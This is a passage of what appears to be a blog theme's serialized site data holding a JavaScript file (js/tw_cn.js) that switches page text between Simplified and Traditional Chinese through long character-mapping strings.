'万与丑专业丛东丝丢两严丧个丬丰临为丽举么义乌乐乔习乡书买乱争于亏云亘亚产亩亲亵亸亿仅从仑仓仪们价众优伙会伛伞伟传伤伥伦伧伪伫体余佣佥侠侣侥侦侧侨侩侪侬俣俦俨俩俪俭债倾偬偻偾偿傥傧储傩儿兑兖党兰关兴兹养兽冁内冈册写军农冢冯冲决况冻净凄凉凌减凑凛几凤凫凭凯击凼凿刍划刘则刚创删别刬刭刽刿剀剂剐剑剥剧劝办务劢动励劲劳势勋勐勚匀匦匮区医华协单卖卢卤卧卫却卺厂厅历厉压厌厍厕厢厣厦厨厩厮县参叆叇双发变叙叠叶号叹叽吁后吓吕吗吣吨听启吴呒呓呕呖呗员呙呛呜咏咔咙咛咝咤咴咸哌响哑哒哓哔哕哗哙哜哝哟唛唝唠唡唢唣唤唿啧啬啭啮啰啴啸喷喽喾嗫呵嗳嘘嘤嘱噜噼嚣嚯团园囱围囵国图圆圣圹场坂坏块坚坛坜坝坞坟坠垄垅垆垒垦垧垩垫垭垯垱垲垴埘埙埚埝埯堑堕塆墙壮声壳壶壸处备复够头夸夹夺奁奂奋奖奥妆妇妈妩妪妫姗姜娄娅娆娇娈娱娲娴婳婴婵婶媪嫒嫔嫱嬷孙学孪宁宝实宠审宪宫宽宾寝对寻导寿将尔尘尧尴尸尽层屃屉届属屡屦屿岁岂岖岗岘岙岚岛岭岳岽岿峃峄峡峣峤峥峦崂崃崄崭嵘嵚嵛嵝嵴巅巩巯币帅师帏帐帘帜带帧帮帱帻帼幂幞干并广庄庆庐庑库应庙庞废庼廪开异弃张弥弪弯弹强归当录彟彦彻径徕御忆忏忧忾怀态怂怃怄怅怆怜总怼怿恋恳恶恸恹恺恻恼恽悦悫悬悭悯惊惧惨惩惫惬惭惮惯愍愠愤愦愿慑慭憷懑懒懔戆戋戏戗战戬户扎扑扦执扩扪扫扬扰抚抛抟抠抡抢护报担拟拢拣拥拦拧拨择挂挚挛挜挝挞挟挠挡挢挣挤挥挦捞损捡换捣据捻掳掴掷掸掺掼揸揽揿搀搁搂搅携摄摅摆摇摈摊撄撑撵撷撸撺擞攒敌敛数斋斓斗斩断无旧时旷旸昙昼昽显晋晒晓晔晕晖暂暧札术朴机杀杂权条来杨杩杰极构枞枢枣枥枧枨枪枫枭柜柠柽栀栅标栈栉栊栋栌栎栏树栖样栾桊桠桡桢档桤桥桦桧桨桩梦梼梾检棂椁椟椠椤椭楼榄榇榈榉槚槛槟槠横樯樱橥橱橹橼檐檩欢欤欧歼殁殇残殒殓殚殡殴毁毂毕毙毡毵氇气氢氩氲汇汉污汤汹沓沟没沣沤沥沦沧沨沩沪沵泞泪泶泷泸泺泻泼泽泾洁洒洼浃浅浆浇浈浉浊测浍济浏浐浑浒浓浔浕涂涌涛涝涞涟涠涡涢涣涤润涧涨涩淀渊渌渍渎渐渑渔渖渗温游湾湿溃溅溆溇滗滚滞滟滠满滢滤滥滦滨滩滪漤潆潇潋潍潜潴澜濑濒灏灭灯灵灾灿炀炉炖炜炝点炼炽烁烂烃烛烟烦烧烨烩烫烬热焕焖焘煅煳熘爱爷牍牦牵牺犊犟状犷犸犹狈狍狝狞独狭狮狯狰狱狲猃猎猕猡猪猫猬献獭玑玙玚玛玮环现玱玺珉珏珐珑珰珲琎琏琐琼瑶瑷璇璎瓒瓮瓯电画畅畲畴疖疗疟疠疡疬疮疯疱疴痈痉痒痖痨痪痫痴瘅瘆瘗瘘瘪瘫瘾瘿癞癣癫癯皑皱皲盏盐监盖盗盘眍眦眬着睁睐睑瞒瞩矫矶矾矿砀码砖砗砚砜砺砻砾础硁硅硕硖硗硙硚确硷碍碛碜碱碹磙礼祎祢祯祷祸禀禄禅离秃秆种积称秽秾稆税稣稳穑穷窃窍窑窜窝窥窦窭竖竞笃笋笔笕笺笼笾筑筚筛筜筝筹签简箓箦箧箨箩箪箫篑篓篮篱簖籁籴类籼粜粝粤粪粮糁糇紧絷纟纠纡红纣纤纥约级纨纩纪纫纬纭纮纯纰纱纲纳纴纵纶纷纸纹纺纻纼纽纾线绀绁绂练组绅细织终绉绊绋绌绍绎经绐绑绒结绔绕绖绗绘给绚绛络绝绞统绠绡绢绣绤绥绦继绨绩绪绫绬续绮绯绰绱绲绳维绵绶绷绸绹绺绻综绽绾绿缀缁缂缃缄缅缆缇缈缉缊缋缌缍缎缏缐缑缒缓缔缕编缗缘缙缚缛缜缝缞缟缠缡缢缣缤缥缦缧缨缩缪缫缬缭缮缯缰缱缲缳缴缵罂网罗罚罢罴羁羟羡翘翙翚耢耧耸耻聂聋职聍联聩聪肃肠肤肷肾肿胀胁胆胜胧胨胪胫胶脉脍脏脐脑脓脔脚脱脶脸腊腌腘腭腻腼腽腾膑臜舆舣舰舱舻艰艳艹艺节芈芗芜芦苁苇苈苋苌苍苎苏苘苹茎茏茑茔茕茧荆荐荙荚荛荜荞荟荠荡荣荤荥荦荧荨荩荪荫荬荭荮药莅莜莱莲莳莴莶获莸莹莺莼萚萝萤营萦萧萨葱蒇蒉蒋蒌蓝蓟蓠蓣蓥蓦蔷蔹蔺蔼蕲蕴薮藁藓虏虑虚虫虬虮虽虾虿蚀蚁蚂蚕蚝蚬蛊蛎蛏蛮蛰蛱蛲蛳蛴蜕蜗蜡蝇蝈蝉蝎蝼蝾螀螨蟏衅衔补衬衮袄袅袆袜袭袯装裆裈裢裣裤裥褛褴襁襕见观觃规觅视觇览觉觊觋觌觍觎觏觐觑觞触觯詟誉誊讠计订讣认讥讦讧讨让讪讫训议讯记讱讲讳讴讵讶讷许讹论讻讼讽设访诀证诂诃评诅识诇诈诉诊诋诌词诎诏诐译诒诓诔试诖诗诘诙诚诛诜话诞诟诠诡询诣诤该详诧诨诩诪诫诬语诮误诰诱诲诳说诵诶请诸诹诺读诼诽课诿谀谁谂调谄谅谆谇谈谊谋谌谍谎谏谐谑谒谓谔谕谖谗谘谙谚谛谜谝谞谟谠谡谢谣谤谥谦谧谨谩谪谫谬谭谮谯谰谱谲谳谴谵谶谷豮贝贞负贠贡财责贤败账货质贩贪贫贬购贮贯贰贱贲贳贴贵贶贷贸费贺贻贼贽贾贿赀赁赂赃资赅赆赇赈赉赊赋赌赍赎赏赐赑赒赓赔赕赖赗赘赙赚赛赜赝赞赟赠赡赢赣赪赵赶趋趱趸跃跄跖跞践跶跷跸跹跻踊踌踪踬踯蹑蹒蹰蹿躏躜躯车轧轨轩轪轫转轭轮软轰轱轲轳轴轵轶轷轸轹轺轻轼载轾轿辀辁辂较辄辅辆辇辈辉辊辋辌辍辎辏辐辑辒输辔辕辖辗辘辙辚辞辩辫边辽达迁过迈运还这进远违连迟迩迳迹适选逊递逦逻遗遥邓邝邬邮邹邺邻郁郄郏郐郑郓郦郧郸酝酦酱酽酾酿释里鉅鉴銮錾钆钇针钉钊钋钌钍钎钏钐钑钒钓钔钕钖钗钘钙钚钛钝钞钟钠钡钢钣钤钥钦钧钨钩钪钫钬钭钮钯钰钱钲钳钴钵钶钷钸钹钺钻钼钽钾钿铀铁铂铃铄铅铆铈铉铊铋铍铎铏铐铑铒铕铗铘铙铚铛铜铝铞铟铠铡铢铣铤铥铦铧铨铪铫铬铭铮铯铰铱铲铳铴铵银铷铸铹铺铻铼铽链铿销锁锂锃锄锅锆锇锈锉锊锋锌锍锎锏锐锑锒锓锔锕锖锗错锚锜锞锟锠锡锢锣锤锥锦锨锩锫锬锭键锯锰锱锲锳锴锵锶锷锸锹锺锻锼锽锾锿镀镁镂镃镆镇镈镉镊镌镍镎镏镐镑镒镕镖镗镙镚镛镜镝镞镟镠镡镢镣镤镥镦镧镨镩镪镫镬镭镮镯镰镱镲镳镴镶长门闩闪闫闬闭问闯闰闱闲闳间闵闶闷闸闹闺闻闼闽闾闿阀阁阂阃阄阅阆阇阈阉阊阋阌阍阎阏阐阑阒阓阔阕阖阗阘阙阚阛队阳阴阵阶际陆陇陈陉陕陧陨险随隐隶隽难雏雠雳雾霁霉霭靓静靥鞑鞒鞯鞴韦韧韨韩韪韫韬韵页顶顷顸项顺须顼顽顾顿颀颁颂颃预颅领颇颈颉颊颋颌颍颎颏颐频颒颓颔颕颖颗题颙颚颛颜额颞颟颠颡颢颣颤颥颦颧风飏飐飑飒飓飔飕飖飗飘飙飚飞飨餍饤饥饦饧饨饩饪饫饬饭饮饯饰饱饲饳饴饵饶饷饸饹饺饻饼饽饾饿馀馁馂馃馄馅馆馇馈馉馊馋馌馍馎馏馐馑馒馓馔馕马驭驮驯驰驱驲驳驴驵驶驷驸驹驺驻驼驽驾驿骀骁骂骃骄骅骆骇骈骉骊骋验骍骎骏骐骑骒骓骔骕骖骗骘骙骚骛骜骝骞骟骠骡骢骣骤骥骦骧髅髋髌鬓魇魉鱼鱽鱾鱿鲀鲁鲂鲄鲅鲆鲇鲈鲉鲊鲋鲌鲍鲎鲏鲐鲑鲒鲓鲔鲕鲖鲗鲘鲙鲚鲛鲜鲝鲞鲟鲠鲡鲢鲣鲤鲥鲦鲧鲨鲩鲪鲫鲬鲭鲮鲯鲰鲱鲲鲳鲴鲵鲶鲷鲸鲹鲺鲻鲼鲽鲾鲿鳀鳁鳂鳃鳄鳅鳆鳇鳈鳉鳊鳋鳌鳍鳎鳏鳐鳑鳒鳓鳔鳕鳖鳗鳘鳙鳛鳜鳝鳞鳟鳠鳡鳢鳣鸟鸠鸡鸢鸣鸤鸥鸦鸧鸨鸩鸪鸫鸬鸭鸮鸯鸰鸱鸲鸳鸴鸵鸶鸷鸸鸹鸺鸻鸼鸽鸾鸿鹀鹁鹂鹃鹄鹅鹆鹇鹈鹉鹊鹋鹌鹍鹎鹏鹐鹑鹒鹓鹔鹕鹖鹗鹘鹚鹛鹜鹝鹞鹟鹠鹡鹢鹣鹤鹥鹦鹧鹨鹩鹪鹫鹬鹭鹯鹰鹱鹲鹳鹴鹾麦麸黄黉黡黩黪黾龙历志制一台皋准复猛钟注范签'\n  const FTPYStr = () => '萬與醜專業叢東絲丟兩嚴喪個爿豐臨為麗舉麼義烏樂喬習鄉書買亂爭於虧雲亙亞產畝親褻嚲億僅從侖倉儀們價眾優夥會傴傘偉傳傷倀倫傖偽佇體餘傭僉俠侶僥偵側僑儈儕儂俁儔儼倆儷儉債傾傯僂僨償儻儐儲儺兒兌兗黨蘭關興茲養獸囅內岡冊寫軍農塚馮衝決況凍淨淒涼淩減湊凜幾鳳鳧憑凱擊氹鑿芻劃劉則剛創刪別剗剄劊劌剴劑剮劍剝劇勸辦務勱動勵勁勞勢勳猛勩勻匭匱區醫華協單賣盧鹵臥衛卻巹廠廳曆厲壓厭厙廁廂厴廈廚廄廝縣參靉靆雙發變敘疊葉號歎嘰籲後嚇呂嗎唚噸聽啟吳嘸囈嘔嚦唄員咼嗆嗚詠哢嚨嚀噝吒噅鹹呱響啞噠嘵嗶噦嘩噲嚌噥喲嘜嗊嘮啢嗩唕喚呼嘖嗇囀齧囉嘽嘯噴嘍嚳囁嗬噯噓嚶囑嚕劈囂謔團園囪圍圇國圖圓聖壙場阪壞塊堅壇壢壩塢墳墜壟壟壚壘墾坰堊墊埡墶壋塏堖塒塤堝墊垵塹墮壪牆壯聲殼壺壼處備複夠頭誇夾奪奩奐奮獎奧妝婦媽嫵嫗媯姍薑婁婭嬈嬌孌娛媧嫻嫿嬰嬋嬸媼嬡嬪嬙嬤孫學孿寧寶實寵審憲宮寬賓寢對尋導壽將爾塵堯尷屍盡層屭屜屆屬屢屨嶼歲豈嶇崗峴嶴嵐島嶺嶽崠巋嶨嶧峽嶢嶠崢巒嶗崍嶮嶄嶸嶔崳嶁脊巔鞏巰幣帥師幃帳簾幟帶幀幫幬幘幗冪襆幹並廣莊慶廬廡庫應廟龐廢廎廩開異棄張彌弳彎彈強歸當錄彠彥徹徑徠禦憶懺憂愾懷態慫憮慪悵愴憐總懟懌戀懇惡慟懨愷惻惱惲悅愨懸慳憫驚懼慘懲憊愜慚憚慣湣慍憤憒願懾憖怵懣懶懍戇戔戲戧戰戩戶紮撲扡執擴捫掃揚擾撫拋摶摳掄搶護報擔擬攏揀擁攔擰撥擇掛摯攣掗撾撻挾撓擋撟掙擠揮撏撈損撿換搗據撚擄摑擲撣摻摜摣攬撳攙擱摟攪攜攝攄擺搖擯攤攖撐攆擷擼攛擻攢敵斂數齋斕鬥斬斷無舊時曠暘曇晝曨顯晉曬曉曄暈暉暫曖劄術樸機殺雜權條來楊榪傑極構樅樞棗櫪梘棖槍楓梟櫃檸檉梔柵標棧櫛櫳棟櫨櫟欄樹棲樣欒棬椏橈楨檔榿橋樺檜槳樁夢檮棶檢欞槨櫝槧欏橢樓欖櫬櫚櫸檟檻檳櫧橫檣櫻櫫櫥櫓櫞簷檁歡歟歐殲歿殤殘殞殮殫殯毆毀轂畢斃氈毿氌氣氫氬氳彙漢汙湯洶遝溝沒灃漚瀝淪滄渢溈滬濔濘淚澩瀧瀘濼瀉潑澤涇潔灑窪浹淺漿澆湞溮濁測澮濟瀏滻渾滸濃潯濜塗湧濤澇淶漣潿渦溳渙滌潤澗漲澀澱淵淥漬瀆漸澠漁瀋滲溫遊灣濕潰濺漵漊潷滾滯灩灄滿瀅濾濫灤濱灘澦濫瀠瀟瀲濰潛瀦瀾瀨瀕灝滅燈靈災燦煬爐燉煒熗點煉熾爍爛烴燭煙煩燒燁燴燙燼熱煥燜燾煆糊溜愛爺牘犛牽犧犢強狀獷獁猶狽麅獮獰獨狹獅獪猙獄猻獫獵獼玀豬貓蝟獻獺璣璵瑒瑪瑋環現瑲璽瑉玨琺瓏璫琿璡璉瑣瓊瑤璦璿瓔瓚甕甌電畫暢佘疇癤療瘧癘瘍鬁瘡瘋皰屙癰痙癢瘂癆瘓癇癡癉瘮瘞瘺癟癱癮癭癩癬癲臒皚皺皸盞鹽監蓋盜盤瞘眥矓著睜睞瞼瞞矚矯磯礬礦碭碼磚硨硯碸礪礱礫礎硜矽碩硤磽磑礄確鹼礙磧磣堿镟滾禮禕禰禎禱禍稟祿禪離禿稈種積稱穢穠穭稅穌穩穡窮竊竅窯竄窩窺竇窶豎競篤筍筆筧箋籠籩築篳篩簹箏籌簽簡籙簀篋籜籮簞簫簣簍籃籬籪籟糴類秈糶糲粵糞糧糝餱緊縶糸糾紆紅紂纖紇約級紈纊紀紉緯紜紘純紕紗綱納紝縱綸紛紙紋紡紵紖紐紓線紺絏紱練組紳細織終縐絆紼絀紹繹經紿綁絨結絝繞絰絎繪給絢絳絡絕絞統綆綃絹繡綌綏絛繼綈績緒綾緓續綺緋綽緔緄繩維綿綬繃綢綯綹綣綜綻綰綠綴緇緙緗緘緬纜緹緲緝縕繢緦綞緞緶線緱縋緩締縷編緡緣縉縛縟縝縫縗縞纏縭縊縑繽縹縵縲纓縮繆繅纈繚繕繒韁繾繰繯繳纘罌網羅罰罷羆羈羥羨翹翽翬耮耬聳恥聶聾職聹聯聵聰肅腸膚膁腎腫脹脅膽勝朧腖臚脛膠脈膾髒臍腦膿臠腳脫腡臉臘醃膕齶膩靦膃騰臏臢輿艤艦艙艫艱豔艸藝節羋薌蕪蘆蓯葦藶莧萇蒼苧蘇檾蘋莖蘢蔦塋煢繭荊薦薘莢蕘蓽蕎薈薺蕩榮葷滎犖熒蕁藎蓀蔭蕒葒葤藥蒞蓧萊蓮蒔萵薟獲蕕瑩鶯蓴蘀蘿螢營縈蕭薩蔥蕆蕢蔣蔞藍薊蘺蕷鎣驀薔蘞藺藹蘄蘊藪槁蘚虜慮虛蟲虯蟣雖蝦蠆蝕蟻螞蠶蠔蜆蠱蠣蟶蠻蟄蛺蟯螄蠐蛻蝸蠟蠅蟈蟬蠍螻蠑螿蟎蠨釁銜補襯袞襖嫋褘襪襲襏裝襠褌褳襝褲襇褸襤繈襴見觀覎規覓視覘覽覺覬覡覿覥覦覯覲覷觴觸觶讋譽謄訁計訂訃認譏訐訌討讓訕訖訓議訊記訒講諱謳詎訝訥許訛論訩訟諷設訪訣證詁訶評詛識詗詐訴診詆謅詞詘詔詖譯詒誆誄試詿詩詰詼誠誅詵話誕詬詮詭詢詣諍該詳詫諢詡譸誡誣語誚誤誥誘誨誑說誦誒請諸諏諾讀諑誹課諉諛誰諗調諂諒諄誶談誼謀諶諜謊諫諧謔謁謂諤諭諼讒諮諳諺諦謎諞諝謨讜謖謝謠謗諡謙謐謹謾謫譾謬譚譖譙讕譜譎讞譴譫讖穀豶貝貞負貟貢財責賢敗賬貨質販貪貧貶購貯貫貳賤賁貰貼貴貺貸貿費賀貽賊贄賈賄貲賃賂贓資賅贐賕賑賚賒賦賭齎贖賞賜贔賙賡賠賧賴賵贅賻賺賽賾贗讚贇贈贍贏贛赬趙趕趨趲躉躍蹌蹠躒踐躂蹺蹕躚躋踴躊蹤躓躑躡蹣躕躥躪躦軀車軋軌軒軑軔轉軛輪軟轟軲軻轤軸軹軼軤軫轢軺輕軾載輊轎輈輇輅較輒輔輛輦輩輝輥輞輬輟輜輳輻輯轀輸轡轅轄輾轆轍轔辭辯辮邊遼達遷過邁運還這進遠違連遲邇逕跡適選遜遞邐邏遺遙鄧鄺鄔郵鄒鄴鄰鬱郤郟鄶鄭鄆酈鄖鄲醞醱醬釅釃釀釋裏钜鑒鑾鏨釓釔針釘釗釙釕釷釺釧釤鈒釩釣鍆釹鍚釵鈃鈣鈈鈦鈍鈔鍾鈉鋇鋼鈑鈐鑰欽鈞鎢鉤鈧鈁鈥鈄鈕鈀鈺錢鉦鉗鈷缽鈳鉕鈽鈸鉞鑽鉬鉭鉀鈿鈾鐵鉑鈴鑠鉛鉚鈰鉉鉈鉍鈹鐸鉶銬銠鉺銪鋏鋣鐃銍鐺銅鋁銱銦鎧鍘銖銑鋌銩銛鏵銓鉿銚鉻銘錚銫鉸銥鏟銃鐋銨銀銣鑄鐒鋪鋙錸鋱鏈鏗銷鎖鋰鋥鋤鍋鋯鋨鏽銼鋝鋒鋅鋶鐦鐧銳銻鋃鋟鋦錒錆鍺錯錨錡錁錕錩錫錮鑼錘錐錦鍁錈錇錟錠鍵鋸錳錙鍥鍈鍇鏘鍶鍔鍤鍬鍾鍛鎪鍠鍰鎄鍍鎂鏤鎡鏌鎮鎛鎘鑷鐫鎳鎿鎦鎬鎊鎰鎔鏢鏜鏍鏰鏞鏡鏑鏃鏇鏐鐔钁鐐鏷鑥鐓鑭鐠鑹鏹鐙鑊鐳鐶鐲鐮鐿鑔鑣鑞鑲長門閂閃閆閈閉問闖閏闈閑閎間閔閌悶閘鬧閨聞闥閩閭闓閥閣閡閫鬮閱閬闍閾閹閶鬩閿閽閻閼闡闌闃闠闊闋闔闐闒闕闞闤隊陽陰陣階際陸隴陳陘陝隉隕險隨隱隸雋難雛讎靂霧霽黴靄靚靜靨韃鞽韉韝韋韌韍韓韙韞韜韻頁頂頃頇項順須頊頑顧頓頎頒頌頏預顱領頗頸頡頰頲頜潁熲頦頤頻頮頹頷頴穎顆題顒顎顓顏額顳顢顛顙顥纇顫顬顰顴風颺颭颮颯颶颸颼颻飀飄飆飆飛饗饜飣饑飥餳飩餼飪飫飭飯飲餞飾飽飼飿飴餌饒餉餄餎餃餏餅餑餖餓餘餒餕餜餛餡館餷饋餶餿饞饁饃餺餾饈饉饅饊饌饢馬馭馱馴馳驅馹駁驢駔駛駟駙駒騶駐駝駑駕驛駘驍罵駰驕驊駱駭駢驫驪騁驗騂駸駿騏騎騍騅騌驌驂騙騭騤騷騖驁騮騫騸驃騾驄驏驟驥驦驤髏髖髕鬢魘魎魚魛魢魷魨魯魴魺鮁鮃鯰鱸鮋鮓鮒鮊鮑鱟鮍鮐鮭鮚鮳鮪鮞鮦鰂鮜鱠鱭鮫鮮鮺鯗鱘鯁鱺鰱鰹鯉鰣鰷鯀鯊鯇鮶鯽鯒鯖鯪鯕鯫鯡鯤鯧鯝鯢鯰鯛鯨鯵鯴鯔鱝鰈鰏鱨鯷鰮鰃鰓鱷鰍鰒鰉鰁鱂鯿鰠鼇鰭鰨鰥鰩鰟鰜鰳鰾鱈鱉鰻鰵鱅鰼鱖鱔鱗鱒鱯鱤鱧鱣鳥鳩雞鳶鳴鳲鷗鴉鶬鴇鴆鴣鶇鸕鴨鴞鴦鴒鴟鴝鴛鴬鴕鷥鷙鴯鴰鵂鴴鵃鴿鸞鴻鵐鵓鸝鵑鵠鵝鵒鷳鵜鵡鵲鶓鵪鶤鵯鵬鵮鶉鶊鵷鷫鶘鶡鶚鶻鶿鶥鶩鷊鷂鶲鶹鶺鷁鶼鶴鷖鸚鷓鷚鷯鷦鷲鷸鷺鸇鷹鸌鸏鸛鸘鹺麥麩黃黌黶黷黲黽龍歷誌製壹臺臯準復勐鐘註範籤'\n\n  const Traditionalized = (cc) => {\n    let str = ''\n    const ss = JTPYStr()\n    const tt = FTPYStr()\n    for (let i = 0; i < cc.length; i++) {\n      if (cc.charCodeAt(i) > 10000 && ss.indexOf(cc.charAt(i)) !== -1) {\n        str += tt.charAt(ss.indexOf(cc.charAt(i)))\n      } else str += cc.charAt(i)\n    }\n    return str\n  }\n\n  const Simplized = (cc) => {\n    let str = ''\n    const ss = JTPYStr()\n    const tt = FTPYStr()\n    for (let i = 0; i < cc.length; i++) {\n      if (cc.charCodeAt(i) > 10000 && tt.indexOf(cc.charAt(i)) !== -1) {\n        str += ss.charAt(tt.indexOf(cc.charAt(i)))\n      } else str += cc.charAt(i)\n    }\n    return str\n  }\n\n  const translateInitialization = () => {\n    if (translateButtonObject) {\n      if (currentEncoding !== targetEncoding) {\n        translateButtonObject.textContent =\n          targetEncoding === 1\n            ? msgToSimplifiedChinese\n            : msgToTraditionalChinese\n        setLang()\n        setTimeout(translateBody, translateDelay)\n      }\n    }\n  }\n\n  window.translateFn = {\n    translatePage,\n    Traditionalized,\n    Simplized,\n    translateInitialization\n  }\n\n  translateInitialization()\n  btf.addGlobalFn('pjaxComplete', translateInitialization, 'translateInitialization')\n})\n","date":"2025-10-07T06:26:10.354Z","updated":"2025-10-07T06:26:10.354Z","path":"js/tw_cn.js","layout":"false","title":"","comments":1,"_id":"cmglxf2i4000iuomygthh35ti","content":"document.addEventListener('DOMContentLoaded', () => {\n  const { defaultEncoding, translateDelay, msgToTraditionalChinese, msgToSimplifiedChinese } = GLOBAL_CONFIG.translate\n  const snackbarData = GLOBAL_CONFIG.Snackbar\n  const targetEncodingCookie = 'translate-chn-cht'\n\n  let currentEncoding = defaultEncoding\n  let targetEncoding = Number(btf.saveToLocal.get(targetEncodingCookie)) || defaultEncoding\n  const translateButtonObject = document.getElementById('translateLink')\n  const isSnackbar = snackbarData !== undefined\n\n  const setLang = () => {\n    document.documentElement.lang = targetEncoding === 1 ? 'zh-TW' : 'zh-CN'\n  }\n\n  const translateText = (txt) => {\n    if (!txt) return ''\n    if (currentEncoding === 1 && targetEncoding === 2) return Simplized(txt)\n    if (currentEncoding === 2 && targetEncoding === 1) return Traditionalized(txt)\n    return txt\n  }\n\n  const translateBody = (fobj) => {\n    const nodes = typeof fobj === 'object' ? fobj.childNodes : document.body.childNodes\n\n    for (const node of nodes) {\n      // Skip BR, HR tags, or the translate button object\n      if (['BR', 'HR'].includes(node.tagName) || node === translateButtonObject) continue\n\n      if (node.nodeType === Node.ELEMENT_NODE) {\n        const { tagName, title, alt, placeholder, value, type } = node\n\n        // Translate title, alt, placeholder\n        if (title) node.title = translateText(title)\n        if (alt) node.alt = translateText(alt)\n        if (placeholder) node.placeholder = translateText(placeholder)\n\n        // Translate input value except text and hidden types\n        if (tagName === 'INPUT' && value && type !== 'text' && type !== 'hidden') {\n          node.value = translateText(value)\n        }\n\n        // Recursively translate child nodes\n        translateBody(node)\n      } else if (node.nodeType === Node.TEXT_NODE) {\n        // Translate text node data\n        node.data = translateText(node.data)\n      }\n    }\n  }\n\n  const translatePage = () => {\n    if (targetEncoding === 1) {\n      currentEncoding = 1\n      targetEncoding = 2\n      translateButtonObject.textContent = msgToTraditionalChinese\n      isSnackbar && btf.snackbarShow(snackbarData.cht_to_chs)\n    } else if (targetEncoding === 2) {\n      currentEncoding = 2\n      targetEncoding = 1\n      translateButtonObject.textContent = msgToSimplifiedChinese\n      isSnackbar && btf.snackbarShow(snackbarData.chs_to_cht)\n    }\n    btf.saveToLocal.set(targetEncodingCookie, targetEncoding, 2)\n    setLang()\n    translateBody()\n  }\n\n  const JTPYStr = () => '万与丑专业丛东丝丢两严丧个丬丰临为丽举么义乌乐乔习乡书买乱争于亏云亘亚产亩亲亵亸亿仅从仑仓仪们价众优伙会伛伞伟传伤伥伦伧伪伫体余佣佥侠侣侥侦侧侨侩侪侬俣俦俨俩俪俭债倾偬偻偾偿傥傧储傩儿兑兖党兰关兴兹养兽冁内冈册写军农冢冯冲决况冻净凄凉凌减凑凛几凤凫凭凯击凼凿刍划刘则刚创删别刬刭刽刿剀剂剐剑剥剧劝办务劢动励劲劳势勋勐勚匀匦匮区医华协单卖卢卤卧卫却卺厂厅历厉压厌厍厕厢厣厦厨厩厮县参叆叇双发变叙叠叶号叹叽吁后吓吕吗吣吨听启吴呒呓呕呖呗员呙呛呜咏咔咙咛咝咤咴咸哌响哑哒哓哔哕哗哙哜哝哟唛唝唠唡唢唣唤唿啧啬啭啮啰啴啸喷喽喾嗫呵嗳嘘嘤嘱噜噼嚣嚯团园囱围囵国图圆圣圹场坂坏块坚坛坜坝坞坟坠垄垅垆垒垦垧垩垫垭垯垱垲垴埘埙埚埝埯堑堕塆墙壮声壳壶壸处备复够头夸夹夺奁奂奋奖奥妆妇妈妩妪妫姗姜娄娅娆娇娈娱娲娴婳婴婵婶媪嫒嫔嫱嬷孙学孪宁宝实宠审宪宫宽宾寝对寻导寿将尔尘尧尴尸尽层屃屉届属屡屦屿岁岂岖岗岘岙岚岛岭岳岽岿峃峄峡峣峤峥峦崂崃崄崭嵘嵚嵛嵝嵴巅巩巯币帅师帏帐帘帜带帧帮帱帻帼幂幞干并广庄庆庐庑库应庙庞废庼廪开异弃张弥弪弯弹强归当录彟彦彻径徕御忆忏忧忾怀态怂怃怄怅怆怜总怼怿恋恳恶恸恹恺恻恼恽悦悫悬悭悯惊惧惨惩惫惬惭惮惯愍愠愤愦愿慑慭憷懑懒懔戆戋戏戗战戬户扎扑扦执扩扪扫扬扰抚抛抟抠抡抢护报担拟拢拣拥拦拧拨择挂挚挛挜挝挞挟挠挡挢挣挤挥挦捞损捡换捣据捻掳掴掷掸掺掼揸揽揿搀搁搂搅携摄摅摆摇摈摊撄撑撵撷撸撺擞攒敌敛数斋斓斗斩断无旧时旷旸昙昼昽显晋晒晓晔晕晖暂暧札术朴机杀杂权条来杨杩杰极构枞枢枣枥枧枨枪枫枭柜柠柽栀栅标栈栉栊栋栌栎栏树栖样栾桊桠桡桢档桤桥桦桧桨桩梦梼梾检棂椁椟椠椤椭楼榄榇榈榉槚槛槟槠横樯樱橥橱橹橼檐檩欢欤欧歼殁殇残殒殓殚殡殴毁毂毕毙毡毵氇气氢氩氲汇汉污汤汹沓沟没沣沤沥沦沧沨沩沪沵泞泪泶泷泸泺泻泼泽泾洁洒洼浃浅浆浇浈浉浊测浍济浏浐浑浒浓浔浕涂涌涛涝涞涟涠涡涢涣涤润涧涨涩淀渊渌渍渎渐渑渔渖渗温游湾湿溃溅溆溇滗滚滞滟滠满滢滤滥滦滨滩滪漤潆潇潋潍潜潴澜濑濒灏灭灯灵灾灿炀炉炖炜炝点炼炽烁烂烃烛烟烦烧烨烩烫烬热焕焖焘煅煳熘爱爷牍牦牵牺犊犟状犷犸犹狈狍狝狞独狭狮狯狰狱狲猃猎猕猡猪猫猬献獭玑玙玚玛玮环现玱玺珉珏珐珑珰珲琎琏琐琼瑶瑷璇璎瓒瓮瓯电画畅畲畴疖疗疟疠疡疬疮疯疱疴痈痉痒痖痨痪痫痴瘅瘆瘗瘘瘪瘫瘾瘿癞癣癫癯皑皱皲盏盐监盖盗盘眍眦眬着睁睐睑瞒瞩矫矶矾矿砀码砖砗砚砜砺砻砾础硁硅硕硖硗硙硚确硷碍碛碜碱碹磙礼祎祢祯祷祸禀禄禅离秃秆种积称秽秾稆税稣稳穑穷窃窍窑窜窝窥窦窭竖竞笃笋笔笕笺笼笾筑筚筛筜筝筹签简箓箦箧箨箩箪箫篑篓篮篱簖籁籴类籼粜粝粤粪粮糁糇紧絷纟纠纡红纣纤纥约级纨纩纪纫纬纭纮纯纰纱纲纳纴纵纶纷纸纹纺纻纼纽纾线绀绁绂练组绅细织终绉绊绋绌绍绎经绐绑绒结绔绕绖绗绘给绚绛络绝绞统绠绡绢绣绤绥绦继绨绩绪绫绬续绮绯绰绱绲绳维绵绶绷绸绹绺绻综绽绾绿缀缁缂缃缄缅缆缇缈缉缊缋缌缍缎缏缐缑缒缓缔缕编缗缘缙缚缛缜缝缞缟缠缡缢缣缤缥缦缧缨缩缪缫缬缭缮缯缰缱缲缳缴缵罂网罗罚罢罴羁羟羡翘翙翚耢耧耸耻聂聋职聍联聩聪肃肠肤肷肾肿胀胁胆胜胧胨胪胫胶脉脍脏脐脑脓脔脚脱脶脸腊腌腘腭腻腼腽腾膑臜舆舣舰舱舻艰艳艹艺节芈芗芜芦苁苇苈苋苌苍苎苏苘苹茎茏茑茔茕茧荆荐荙荚荛荜荞荟荠荡荣荤荥荦荧荨荩荪荫荬荭荮药莅莜莱莲莳莴莶获莸莹莺莼萚萝萤营萦萧萨葱蒇蒉蒋蒌蓝蓟蓠蓣蓥蓦蔷蔹蔺蔼蕲蕴薮藁藓虏虑虚虫虬虮虽虾虿蚀蚁蚂蚕蚝蚬蛊蛎蛏蛮蛰蛱蛲蛳蛴蜕蜗蜡蝇蝈蝉蝎蝼蝾螀螨蟏衅衔补衬衮袄袅袆袜袭袯装裆裈裢裣裤裥褛褴襁襕见观觃规觅视觇览觉